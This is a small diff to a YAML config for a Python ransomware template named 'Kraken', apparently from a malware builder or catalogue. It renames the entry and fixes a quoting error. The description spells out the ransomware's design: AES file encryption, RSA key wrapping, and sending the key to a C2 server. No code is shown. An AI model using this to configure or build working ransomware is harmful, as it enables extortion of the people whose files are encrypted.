@@ -1,4 +1,4 @@
-name: "Kraken"
+name: "Kraken_py"
 lang: "py"
 malware_type: "Ransomware"
 description: "A basic ransomware that generate an AES key, encrypt files, then encrypt the key using RSA and a base64 encoded public key and send the key with some basic metadata to a C2 URL using POST"
@@ -25,7 +25,7 @@ features:
     mandatory: False
     default: "kraken"
   - name: rsa_public_key_b64
-    description: the RSA public key encoded in base64"
+    description: "the RSA public key encoded in base64"
     type: "string"
     mandatory: True
     default: ""
